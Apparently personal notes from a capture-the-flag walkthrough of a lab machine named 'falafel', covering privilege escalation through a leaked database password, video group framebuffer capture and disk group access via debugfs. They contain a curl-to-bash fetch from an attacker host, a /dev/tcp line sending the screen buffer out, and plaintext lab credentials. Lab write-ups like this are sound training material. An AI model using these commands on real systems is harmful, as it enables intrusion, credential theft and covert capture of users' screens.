# Exploring the System 
```bash
www-data@falafel:/var/www/html$ cat authorized.php 
<?php
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

if(isset($_SESSION)) {
        if(basename($_SERVER['PHP_SELF']) == 'upload.php'){
                if($_SESSION['role'] != 'admin'){
                        header('Location: profile.php');
                        exit();
                }
        }
        else{ //basename($_SERVER['PHP_SELF']) == 'profile.php'
                if($_SESSION['role'] == ''){
                        header('Location: login.php');
                }
        }
}
else{
        header('Location: login.php');
        exit();
}
www-data@falafel:/var/www/html$ cat connection.php 
<?php
   define('DB_SERVER', 'localhost:3306');
   define('DB_USERNAME', 'moshe');
   define('DB_PASSWORD', 'falafelIsReallyTasty');
   define('DB_DATABASE', 'falafel');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
   // Check connection
   if (mysqli_connect_errno())
   {
      echo "Failed to connect to MySQL: " . mysqli_connect_error();
   }
?>

```

```bash
curl http://10.10.14.21/linpeash.sh | bash
```
![[Pasted image 20211126102222.png]]
Yossi are physical logon in machine


Login on SSH as moshe

Creds: moshe:falafelIsReallyTasty
moshe has the group video, can see the monitor of a physical user
![[Pasted image 20211126100843.png]]

Getting the file fb0 to see the monitor of Yossi
```bash
moshe@falafel:/home$ cat /dev/fb0 > /dev/tcp/10.10.14.21/9001
```

Grabbing the resolution of monitor
![[Pasted image 20211126102705.png]]

Open on gimp
![[Pasted image 20211126102854.png]]

![[Pasted image 20211126102929.png]]

Creds: yossi:MoshePlzStopHackingMe!
![[Pasted image 20211126103446.png]]

Yossi has the group disk, can see all files on the disk
![[Pasted image 20211126104551.png]]

Using debugfs,  can have acess to root directory
![[Pasted image 20211126104856.png]]
